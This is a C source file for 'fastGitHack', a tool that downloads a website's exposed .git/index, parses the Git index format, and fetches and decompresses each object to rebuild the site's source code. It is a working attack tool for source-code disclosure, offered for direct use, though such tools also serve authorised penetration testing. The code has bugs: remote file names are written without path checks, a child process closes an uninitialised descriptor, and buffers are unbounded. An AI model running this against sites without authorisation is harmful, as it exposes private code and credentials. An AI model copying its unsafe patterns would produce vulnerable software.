#include <stdio.h>
#include "githack.h"

int
hex2dec (unsigned char *hex, int len)
{
    char result[BUFFER_SIZE];
    char *format = (char *) calloc (sizeof (char), BUFFER_SIZE);
    memset (format, '\0', BUFFER_SIZE);
    char *format_prefix = "0x";
    strcat (format, format_prefix);
    for (int i = 0; i < len; i++)
    {
	    strcat (format, "%x");
    }
    sprintf (result, format, hex[0], hex[1], hex[2], hex[3]);
    free (format);
    return (int) strtol (result, NULL, 16);
}

char *
sha12hex (unsigned char *sha1)
{
    char *result = (char *) calloc (sizeof (char), 41);
    sprintf (result, "%02x%02x%02x%02x%02x%02x%02x%02x"
	     "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
	     sha1[0], sha1[1], sha1[2], sha1[3], sha1[4],
	     sha1[5], sha1[6], sha1[7], sha1[8], sha1[9],
	     sha1[10], sha1[11], sha1[12], sha1[13], sha1[14],
	     sha1[15], sha1[16], sha1[17], sha1[18], sha1[19]);
    result[40] = '\0';
    return result;
}

int
signature_check (Magic_head * magic_head)
{
    return magic_head->signature[0] == 'D'
	&& magic_head->signature[1] == 'I'
	&& magic_head->signature[2] == 'R'
	&& magic_head->signature[3] == 'C' ? TRUE : FALSE;
}

int
version_check (Magic_head * magic_head)
{
    int version = hex2dec (magic_head->version, 4);
    return version == 2 || version == 3 || version == 4 ? TRUE : FALSE;
}

void
init_check (FILE * file, Magic_head * magic_head)
{
    fread (magic_head, sizeof (Magic_head), 1, file);
    assert (signature_check (magic_head) == TRUE);
    assert (version_check (magic_head) == TRUE);
}

int
sed2bed (int value)
{
    return ((value & 0x000000FF) << 24) |
	((value & 0x0000FF00) << 8) |
	((value & 0x00FF0000) >> 8) | ((value & 0xFF000000) >> 24);
}

void
pad_entry (FILE * file, int entry_len)
{
    char pad[1];
    int padlen = (8 - (entry_len % 8)) ? (8 - (entry_len % 8)) : 8;
    for (int i = 0; i < padlen; i++)
    {
	    fread (pad, 1, 1, file);
	    assert (pad[0] == '\0');
    }

}

char *
get_name (FILE * file, int namelen, int *entry_len)
{
    char *name = (char *) calloc (sizeof (char), 0xFFF);
    if (namelen < 0xFFF)
    {
        fread (name, 1, namelen, file);
        name[namelen] = '\0';
        *entry_len += namelen;
    }
    else
    {
	    *entry_len += namelen;
    }
    return name;
}

void
handle_version3orlater (FILE * file, int *entry_len)
{
    struct _extra_flags extra_flag;
    unsigned char extra_flag_buf[2];
    fread (extra_flag_buf, 1, 2, file);
    //1-bit reserved for future
    extra_flag.reserved = hex2dec (extra_flag_buf, 2) & 0x8000;
    //1-bit skip-worktree flag (used by sparse checkout)
    extra_flag.skip_worktree = hex2dec (extra_flag_buf, 2) & 0x4000;
    //1-bit intent-to-add flag (used by "git add -N")
    extra_flag.intent_to_add = hex2dec (extra_flag_buf, 2) & 0x2000;
    //13-bit unused, must be zero
    extra_flag.unused = hex2dec(extra_flag_buf, 2) & 0x1fff;
    assert(extra_flag.unused == 0);
    entry_len += 2;
}

int
get_ip_from_host (char *ipbuf, const char *host, int maxlen)
{
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    if (inet_aton (host, &sa.sin_addr) == 0)
    {
        struct hostent *he;
        he = gethostbyname (host);
        if (he == NULL)
            return -1;
        memcpy (&sa.sin_addr, he->h_addr, sizeof (struct in_addr));
    }
    strncpy (ipbuf, inet_ntoa (sa.sin_addr), maxlen);
    return 0;
}

void
parse_http_url (char *http_url, struct url_combo *url_combo)
{
    int protocol_len = strchr (http_url, '/') - http_url + 2;
    strncpy (url_combo->protocol, http_url, protocol_len);
    url_combo->protocol[protocol_len] = '\0';
    assert (!strcmp (url_combo->protocol, "http://")
	    || !strcmp (url_combo->protocol, "https://"));
    url_combo->uri = strchr (http_url + protocol_len, '/');
    strncpy (url_combo->host, http_url + protocol_len,
	     url_combo->uri - (http_url + protocol_len));
    url_combo->host[url_combo->uri - (http_url + protocol_len)] = '\0';
}

int *
http_get (char *http_url)
{
    struct url_combo url_combo;
    int *sockfd = (int *) malloc (sizeof (int));
    int len;
    struct sockaddr_in address;
    char ip[128];
    int result;
    char http_header_raw[1024];
    parse_http_url (http_url, &url_combo);
    //char *filename = strrchr(url_combo.uri, '/') + 1;
    memset (http_header_raw, '\0', 1024);
    strcat (http_header_raw, "GET ");
    strcat (http_header_raw, url_combo.uri);
    strcat (http_header_raw, " HTTP/1.1");
    strcat (http_header_raw, "\r\nHost: ");
    strcat (http_header_raw, url_combo.host);
    strcat (http_header_raw, "\r\nReferer: ");
    strcat (http_header_raw, url_combo.protocol);
    strcat (http_header_raw, url_combo.host);
    strcat (http_header_raw, "\r\nUser-Agent:Mozilla/5.0 (X11; Linux x86_64) \
            AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36");
    strcat (http_header_raw, "\r\nConnection: Close\r\n\r\n");
    *sockfd = socket (AF_INET, SOCK_STREAM, 0);
    address.sin_family = AF_INET;
    memset (ip, '\0', 128);
    get_ip_from_host (ip, url_combo.host, 128);
    address.sin_addr.s_addr = inet_addr (ip);
    address.sin_port = htons (80);
    len = sizeof (address);
    result = connect (*sockfd, (struct sockaddr *) &address, len);
    if (result == -1)
    {
	    perror ("error");
	    exit (1);
    }
    write (*sockfd, http_header_raw, strlen (http_header_raw));
    return sockfd;
}


void touch_file_et(int *sockfd, const char *filename, int filesize){
    if(!filesize) {
        return;
    }
    char filepath[10240] = { '\0' };
    strcat (filepath, filename);
    //int fd = open (filepath, O_RDWR | O_CREAT,
   // 		   S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    int i = 0;
    char ch;
    unsigned char buf[filesize*100];
    unsigned long j = 0l;
    while (read (*sockfd, &ch, 1))
    {
        if (i < 4)
        {
            if (ch == '\r' || ch == '\n'){
                i++;
            }
            else{
                i = 0;
            }
            //printf("%c", ch);
        }else 
        {
            //write (fd, &ch, 1);
            buf[j++] = ch;
            //buf++;
            //write(1, &ch, 1);
        }
    }
    char blob_header_tmp[100];
    sprintf(blob_header_tmp, "blob %d", filesize);
    char *blob_header = blob_header_tmp;
    char* text = (char *) malloc(filesize + strlen(blob_header) + 1);
    unsigned long tlen = filesize + strlen(blob_header) + 1;
    printf("%s\t%d\n", filename, filesize);
    if(uncompress(text, &tlen, buf, j+1) != Z_OK){  
        //printf("uncompress failed!\n");  
        //free(text);
        //close(fd);
        return;
    }  
    FILE *file = fopen(filename, "wb+");
    char* blob = strchr(text, '\0') + 1;
    //for(unsigned long i = 0l;i < strlen(blob); i++) {
    //        write(fd, &blob[i], 1);
    //}
    fwrite(blob, 1, filesize, file);
    fclose(file);
    free(text);
    //free(buf);
    //close (fd);
}

int
create_dir (const char *sPathName)
{
    char DirName[256];
    strcpy (DirName, sPathName);
    int i, len = strlen (DirName);
    if (DirName[len - 1] != '/')
	strcat (DirName, "/");
    len = strlen (DirName);
    for (i = 1; i < len; i++)
    {
        if (DirName[i] == '/')
        {
            DirName[i] = 0;
            if (access (DirName, F_OK) == -1)
            {
                if (mkdir (DirName, 0755) == -1)
                {
                    return -1;
                }
            }
            DirName[i] = '/';
        }
    }
    return 0;
}

void
split_pathname (int *sockfd,struct ce_body* ce_body)
{
    char *result = strrchr (ce_body->name, '/');
    if (result)
    {
        char dir[BUFFER_SIZE] = { '\0' };
        int dis = result - ce_body->name;
        if (dis > BUFFER_SIZE)
            {
                printf ("pathname is too long");
                exit (-1);
            }
            strncpy (dir, ce_body->name, dis);
            if (create_dir (dir) == -1)
            {
                perror ("mkdir error");
                //exit(0);
            }
    }
    touch_file_et (sockfd, ce_body->name,hex2dec((ce_body->entry_body->size), 4));
}

void
touch_index_file (int *sockfd)
{
    int fd = open ("index", O_RDWR | O_CREAT,
		   S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    int i = 0;
    char ch;
    while (read (*sockfd, &ch, 1))
    {
        if (i < 4)
        {
            if (ch == '\r' || ch == '\n'){
                i++;
            }
            else{
                i = 0;
            }
        }else 
        {
            write (fd, &ch, 1);
        }
    }
}

void
mk_dir (char *path)
{
    if (mkdir (path, 0755) == -1)
    {
        perror ("mkdir error");
        exit (1);
    }
}

void 
concat_object_url(Entry_body *entry_body, char *object_url, char *url) {
        strcat (object_url, url);
        strcat (object_url, "/objects/");
        //printf("%s\n", sha12hex(entry_body->sha1));
        char dir[3];
        char *file_name = sha12hex (entry_body->sha1) + 2;
        strncpy (dir, sha12hex (entry_body->sha1), 2);
        dir[2] = '\0';
        strcat (object_url, dir);
        strcat (object_url, "/");
        strcat (object_url, file_name);
}

int check_argv(int argc, char *argv[]) {
    if (argc != 2)
    {
	    printf ("usage fastGitHack url\n"
                "example: fastGitHack http://localhost/.git\n");
        return -1;

    }
    if(strlen (argv[1]) > (BUFFER_SIZE - strlen("index"))) {
        printf("url is to long");
        return -1;
    }
    return 0;
}

int
main (int argc, char *argv[])
{
    FILE *index;
    char index_url[BUFFER_SIZE];
    int *index_socckfd, ent_num;
    struct url_combo url_combo;
    if (check_argv (argc, argv) == -1) {
        exit(-1);
    }
    sprintf(index_url, "%s/index", argv[1]);
    parse_http_url (argv[1], &url_combo);
    mk_dir (url_combo.host);
    assert (chdir (url_combo.host) == 0);
    index_socckfd = http_get (index_url);
    touch_index_file (index_socckfd);
    Magic_head *magic_head = (Magic_head *) malloc (sizeof (Magic_head));
    //Entry *entry = (Entry *) malloc (sizeof (Entry));
    if ((index = fopen ("./index", "r")) == NULL) {
	    perror ("open");
	    exit (-1);
    }
    init_check (index, magic_head);
    ent_num = hex2dec (magic_head->file_num, 4);
    printf("find %d files, downloading~\n", ent_num);
    for (int i = 1; i <= ent_num; i++)
    {
        //entry->id = i;
        int *sockfd;
        Entry_body *entry_body = (Entry_body *) malloc (sizeof (Entry_body));
        struct ce_body *ce_body = (struct ce_body*) malloc(sizeof (struct ce_body));
        //entry->entry_body = entry_body;
        //printf("%ld\n", sizeof(Entry_body));
        fread (entry_body, sizeof (Entry_body), 1, index);
        //printf("%d\n", hex2dec(entry_body->gid, 4));
        //printf("%d\n", hex2dec(entry_body->uid, 4));
        //printf("%d\n", hex2dec(entry_body->size, 4));
        //printf("%d\n", hex2dec(entry_body->ino, 4));
        //printf("%d\n", (hex2dec(entry_body->file_mode, 4) & 0xF000) >> 12);
        //printf("%o\n", hex2dec(entry_body->file_mode, 4) & 0x1FF);
        //printf("%s\n", sha12hex(entry_body->sha1));
        //printf("%s\n", file_url);
        struct _flags file_flags;
        file_flags.assume_valid = hex2dec (entry_body->ce_flags, 2) & 0x8000;
        file_flags.extended = hex2dec (entry_body->ce_flags, 2) & 0x4000;
        if(hex2dec(magic_head->version, 4) == 2) {
            assert(file_flags.extended == 0);
        }
        file_flags.stage.stage_one =
            hex2dec (entry_body->ce_flags, 2) & 0x2000;
        file_flags.stage.stage_two =
            hex2dec (entry_body->ce_flags, 2) & 0x1000;
        int namelen = hex2dec (entry_body->ce_flags, 2) & 0xFFF;
        int entry_len = ENTRY_SIZE;
        if (file_flags.extended && hex2dec (magic_head->version, 4) >= 3)
        {
            handle_version3orlater (index, &entry_len);
        }
        ce_body->name = get_name (index, namelen, &entry_len);
        ce_body->entry_len = entry_len;
        pad_entry (index, ce_body->entry_len);
        int pid;
        if ((pid = fork ()) == -1)
        {
            perror ("fork");
        }
        if (pid == 0)
        {
            //printf ("%s\n", ce_body.name);
            ce_body->entry_body = entry_body;
            char object_url[BUFFER_SIZE] = {'\0'};
            concat_object_url (entry_body, object_url, argv[1]);
            int *sockfd2 = http_get (object_url);
            split_pathname (sockfd2, ce_body);
            close (*sockfd);
            exit(0);
        }
        //touch_file(sockfd2, ce_body.name); 
        free(entry_body);
        free(ce_body);
    }
    fclose (index);
    free (magic_head);
    while(wait(NULL) != -1){}
}

